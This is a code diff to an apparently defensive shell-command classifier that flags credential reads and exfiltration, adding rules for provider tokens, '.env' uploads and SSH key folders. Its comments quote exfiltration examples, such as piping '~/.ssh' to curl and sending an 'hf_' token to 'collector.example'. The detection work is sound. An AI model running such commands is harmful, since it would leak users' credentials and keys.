@@ -436,6 +436,20 @@ ENV_FILE = re.compile(
     re.IGNORECASE | re.MULTILINE,
 )
 
+# The two ways a bare `.env` leaves without a read verb: as a curl or httpie
+# data file (`-d @.env`, `-F f=@.env`), and staged into git (`git add -f
+# .env`). Neither was matched, so both sent the file with no credential half
+# (#431). Matched against the fully masked view, so a commit message that
+# explains `@.env` is not a send; a quoted `"@.env"` is missed, which is the
+# rarer spelling. At most 32 paths are skipped before `.env`, which keeps a
+# long run of `git add` words linear.
+ENV_FILE_SENT = re.compile(
+    r"@\.env" + _ENV_PLACEHOLDER + r"(?:\.[A-Za-z0-9_-]+)?\b|"
+    r"\bgit\s+add\s+(?:-[-\w]+\s+){0,8}(?:[^\s;&|]+\s+){0,32}?\.env" + _ENV_PLACEHOLDER
+    + r"(?:\.[A-Za-z0-9_-]+)?\b",
+    re.IGNORECASE,
+)
+
 # `.ssh[/\\]` required a separator *after* the directory name, so a named key
 # matched and the directory holding every key did not: `cp -r ~/.ssh /tmp/k`
 # and `tar czf - ~/.ssh | curl -T - https://...` both produced no traits at all.
@@ -517,6 +531,158 @@ CREDENTIAL_CLI = re.compile(
 )
 
 # ----------------------------------------------------------------------
+# A credential sent to the service that issued it (#431)
+#
+# `credential-read-then-cloud-api` and `credential-exfil` fired on order: any
+# credential, then any cloud CLI or any egress. For a provider token that is
+# backwards. `hf auth login --token $HF_TOKEN`, `curl -H "Bearer $HF_TOKEN"
+# https://huggingface.co/api/whoami-v2` and `gh api` with `$GH_TOKEN` are the
+# documented ways to use those tokens, and each fired critical. A Hugging Face
+# forum reader put it plainly: the signal is where the secret ends up, not the
+# order of the calls.
+#
+# So a command whose only credential evidence is one or more provider tokens
+# (named variables or literal token values), and which sends them nowhere but
+# that provider's own hosts or its own CLI, is using a credential, not
+# accessing a stored one. It earns no credential half. Anything else in the
+# same command (a credential file, a dump, a key, a token for a different
+# provider, a host outside the issuer) and the exemption does not apply.
+#
+# A literal token value in a command is now credential evidence too. It was
+# invisible, so `curl "https://collector.example/c?t=hf_..."` sent a live token
+# off the box with no finding.
+#
+# Residual, stated: the issuer's own API can still be misused with a stolen
+# token (reading private repositories, publishing). That is account misuse
+# (T1078), not the token leaving, and it is not what these rules measure.
+# ----------------------------------------------------------------------
+
+#: provider -> (variable names, literal token pattern, issuer hosts, CLI words)
+_ISSUERS: dict[str, tuple[frozenset[str], str, tuple[str, ...], tuple[str, ...]]] = {
+    "huggingface": (
+        frozenset({"HF_TOKEN", "HUGGING_FACE_HUB_TOKEN", "HUGGINGFACE_TOKEN", "HF_API_TOKEN"}),
+        r"hf_[A-Za-z0-9]{30,}",
+        ("huggingface.co", "hf.co"),
+        ("hf", "huggingface-cli"),
+    ),
+    "github": (
+        frozenset({"GITHUB_TOKEN", "GH_TOKEN", "GH_ENTERPRISE_TOKEN"}),
+        r"gh[pousr]_[A-Za-z0-9]{36,}|github_pat_[A-Za-z0-9_]{50,}",
+        ("github.com", "githubusercontent.com", "ghcr.io"),
+        ("gh",),
+    ),
+    "gitlab": (
+        frozenset({"GITLAB_TOKEN", "CI_JOB_TOKEN"}),
+        r"glpat-[A-Za-z0-9_-]{20,}",
+        ("gitlab.com",),
+        ("glab",),
+    ),
+    "npm": (
+        frozenset({"NPM_TOKEN", "NODE_AUTH_TOKEN"}),
+        r"npm_[A-Za-z0-9]{36,}",
+        ("registry.npmjs.org", "npmjs.com"),
+        ("npm", "yarn", "pnpm"),
+    ),
+    "pypi": (
+        frozenset({"PYPI_TOKEN", "TWINE_PASSWORD", "UV_PUBLISH_TOKEN", "POETRY_PYPI_TOKEN_PYPI"}),
+        r"pypi-[A-Za-z0-9_-]{50,}",
+        ("pypi.org", "upload.pypi.org", "test.pypi.org"),
+        ("twine", "uv", "poetry"),
+    ),
+    "openai": (
+        frozenset({"OPENAI_API_KEY"}),
+        r"sk-proj-[A-Za-z0-9_-]{20,}",
+        ("api.openai.com",),
+        (),
+    ),
+    "anthropic": (
+        frozenset({"ANTHROPIC_API_KEY"}),
+        r"sk-ant-[A-Za-z0-9_-]{20,}",
+        ("api.anthropic.com",),
+        (),
+    ),
+    "aws": (
+        frozenset({"AWS_SECRET_ACCESS_KEY", "AWS_ACCESS_KEY_ID", "AWS_SESSION_TOKEN"}),
+        r"AKIA[0-9A-Z]{16}",
+        ("amazonaws.com",),
+        ("aws",),
+    ),
+    "docker": (
+        frozenset({"DOCKER_PASSWORD"}),
+        r"dckr_pat_[A-Za-z0-9_-]{20,}",
+        ("docker.io", "docker.com"),
+        ("docker",),
+    ),
+}
+
+LITERAL_SECRET = re.compile(
+    r"(?<![A-Za-z0-9_-])(?:" + "|".join(p[1] for p in _ISSUERS.values()) + r")"
+)
+_LITERAL_BY_PROVIDER = {
+    name: re.compile(r"(?<![A-Za-z0-9_-])(?:" + spec[1] + r")") for name, spec in _ISSUERS.items()
+}
+_VAR_PROVIDER = {var: name for name, spec in _ISSUERS.items() for var in spec[0]}
+_ENV_REF_NAME = re.compile(
+    r"\$\{?([A-Za-z_][A-Za-z0-9_]*)|%([A-Za-z_][A-Za-z0-9_]*)%|\$env:([A-Za-z_][A-Za-z0-9_]*)",
+    re.IGNORECASE,
+)
+
+
+def _host_of_issuer(host: str, domains: tuple[str, ...]) -> bool:
+    host = host.lower().strip("[]")
+    return any(host == d or host.endswith("." + d) for d in domains)
+
+
+def issuer_bound(spoken: str, written: str) -> bool:
+    """True when every credential in the command goes only to the service that issued it."""
+    providers: set[str] = set()
+    for m in _ENV_REF_NAME.finditer(spoken):
+        name = (m.group(1) or m.group(2) or m.group(3) or "").upper()
+        if re.fullmatch(_CREDENTIAL_ENV_NAME, name, re.IGNORECASE):
+            provider = _VAR_PROVIDER.get(name)
+            if provider is None:
+                return False  # a credential with no known issuer
+            providers.add(provider)
+    for name, pattern in _LITERAL_BY_PROVIDER.items():
+        if pattern.search(spoken):
+            providers.add(name)
+    if not providers:
+        return False
+    domains = tuple(d for p in providers for d in _ISSUERS[p][2])
+    hosts = [h for h in URL_HOST.findall(spoken) if not LOOPBACK_HOST.match(h)]
+    hosts += [ip for ip in BARE_IP.findall(spoken) if not LOOPBACK_HOST.match(ip)]
+    if hosts:
+        return all(_host_of_issuer(h, domains) for h in hosts)
+    # No host named: the provider's own CLI is the only place the secret goes.
+    for provider in providers:
+        clis = _ISSUERS[provider][3]
+        if not clis or not re.search(
+            r"(?:^|[\s;&|(])(?:" + "|".join(re.escape(c) for c in clis) + r")(?=\s|$)",
+            written,
+            re.IGNORECASE,
+        ):
+            return False
+    return True
+
+
+# Loading secrets into the environment, which is how a cloud CLI is meant to
+# get them. `source .env` followed by `hf upload` fired
+# credential-read-then-cloud-api at critical (#431). The load still counts as
+# credential access for the other rules; this only stops it from being the
+# first half of the cloud-CLI sequence.
+ENV_LOAD = re.compile(
+    r"(?:^|[\s;&|(])(?:source|\.)\s+[^\s;&|]*\.env\b|\bset\s+-a\b|"
+    r"\bdotenv\s+(?:run|-e)\b|\bload_dotenv\s*\(",
+    re.IGNORECASE,
+)
+_READS_CREDENTIAL_FILE = re.compile(
+    r"\b(?:cat|bat|less|more|head|tail|type|get-content|gc|cp|mv|scp|rsync|base64|xxd|od|"
+    r"strings|grep|rg|awk|sed|curl|wget)\b",
+    re.IGNORECASE,
+)
+
+
+# ----------------------------------------------------------------------
 # Techniques the mapper can see in a command (#55)
 #
 # Everything that reached a shell and was not a credential read or network
@@ -567,6 +733,66 @@ DECODE_COMMAND = re.compile(
     r"\bxxd\s+(?:-\w+\s+)*-r\b",
     re.IGNORECASE,
 )
+
+
+# Listing a key folder is discovery, not a key read. `Get-ChildItem
+# $env:USERPROFILE\.ssh` names the files and opens none, and in week 11 it was
+# the credential half of a critical `dotfile-read-then-git-push` whose second
+# half was a push of the user's own repository. ATT&CK puts *searching* for key
+# files under T1552.004, and the vendor rules that do so (Elastic's Private Key
+# Searching Activity, SigmaHQ's Private Keys Reconnaissance) match `find` and
+# `dir` hunting for key names across a filesystem, not one folder's listing.
+# So a stage that only lists or stats, alone or piped into filters that only
+# narrow the listing, is blanked before the key-path rule looks. `find` stays a
+# search, and anything that reads, copies or archives a key still counts. A
+# listing piped into `xargs cat` is not exempt.
+_LISTING_VERBS = frozenset({
+    "ls", "ll", "dir", "gci", "get-childitem", "tree", "stat", "test-path",
+})
+_LISTING_FILTERS = frozenset({
+    "head", "tail", "wc", "sort", "uniq", "grep", "findstr", "select-object",
+    "select", "format-table", "ft", "measure-object", "measure", "where-object", "where",
+})
+
+
+def _first_word(stage: str) -> str:
+    words = stage.strip().split(None, 1)
+    return words[0].lower() if words else ""
+
+
+#: A recursive listing is a search: `dir /s *.pem` and `Get-ChildItem C:\
+#: -Recurse -Include id_rsa` are the reconnaissance SigmaHQ flags.
+_RECURSIVE_LISTING = re.compile(r"(?:^|\s)(?:-recurse\b|-r\b|-R\b|/s\b|--recursive\b)", re.IGNORECASE)
+
+
+def mask_key_listings(view: str, raw: str | None = None) -> str:
+    """Blank commands that only list or stat files, so a key folder's listing is not a key read."""
+    view = view or ""
+    source = raw if raw is not None and len(raw) == len(view) else view
+    out: list[str] | None = None
+    start = 0
+    bounds = [m.start() for m in _COMMAND_SEPARATORS.finditer(source)] + [len(source)]
+    for end in bounds:
+        chunk = source[start:end]
+        stages = chunk.split("|")
+        if (
+            _first_word(stages[0]) in _LISTING_VERBS
+            and not _RECURSIVE_LISTING.search(stages[0])
+            and all(_first_word(s) in _LISTING_FILTERS for s in stages[1:])
+        ):
+            if out is None:
+                out = list(view)
+            for i in range(start, end):
+                out[i] = " "
+        start = end + 1
+    return view if out is None else "".join(out)
+
+
+def lists_key_folder(text: str) -> bool:
+    """A key-folder listing that `mask_key_listings` blanked: discovery (T1083)."""
+    return bool(PRIVATE_KEY_PATH.search(text or "")) and not PRIVATE_KEY_PATH.search(
+        mask_key_listings(text or "")
+    )
 
 
 # Reading only the *names* in a `.env` file reads no secret. `grep -E "^[A-Z_]+="
@@ -909,6 +1135,7 @@ KNOWN_TRAITS = frozenset({
     "private_key",
     "net_egress",
     "fetch_to_file",
+    "credential_env_load",
 })
 
 
@@ -1082,7 +1309,10 @@ def classify_command(command: str) -> list[str]:
     written = mask_literals(command)
     literal = mask_literals(command, include_double=False)
     # Path rules only: a pipeline keeping just `.env` key names reads no value.
-    env_literal = mask_env_names_only(literal, spoken)
+    # Path rules only: a listing opens nothing, and a pipeline keeping just
+    # `.env` key names reads no value.
+    path_literal = mask_key_listings(literal, spoken)
+    env_literal = mask_env_names_only(path_literal, spoken)
 
     # The IP may legitimately sit inside quotes; the fetch verb may not.
     remote_ips = [ip for ip in RAW_IP_URL.findall(spoken) if not LOOPBACK_IP.match(ip)]
@@ -1116,17 +1346,38 @@ def classify_command(command: str) -> list[str]:
     # expands inside double quotes, so `echo "$AWS_SECRET_ACCESS_KEY"` is a real
     # dereference. Path forms read `literal`, which is what stops a heredoc full
     # of source code from being read as a credential read (#40).
-    if (
-        CREDENTIAL_PATH.search(literal)
+    # A provider token sent only to its issuer is being used, not taken (#431).
+    token_used = bool(
+        (CREDENTIAL_ENV.search(spoken) or LITERAL_SECRET.search(spoken))
+        and not issuer_bound(spoken, written)
+    )
+    file_read = bool(
+        CREDENTIAL_PATH.search(path_literal)
         or ENV_FILE.search(env_literal)
-        or CREDENTIAL_ENV.search(spoken)
+        or ENV_FILE_SENT.search(written)
+    )
+    if (
+        file_read
+        or token_used
         or CREDENTIAL_ENV_DUMP.search(written)
         # A command word, so `written`: writing `aws secretsmanager
         # get-secret-value` into a runbook is not reading a secret.
         or CREDENTIAL_CLI.search(written)
     ):
         traits.append("credential_access")
-    if PRIVATE_KEY_PATH.search(literal):
+        # Only loading `.env` into the shell, which is how a cloud CLI is meant
+        # to get its secrets: not the first half of the cloud-CLI sequence.
+        if (
+            file_read
+            and ENV_LOAD.search(written)
+            and not token_used
+            and not CREDENTIAL_PATH.search(path_literal)
+            and not CREDENTIAL_ENV_DUMP.search(written)
+            and not CREDENTIAL_CLI.search(written)
+            and not _READS_CREDENTIAL_FILE.search(written)
+        ):
+            traits.append("credential_env_load")
+    if PRIVATE_KEY_PATH.search(path_literal):
         traits.append("private_key")
 
     # Egress as a fact about one event. `credential-exfil` needed a *later*
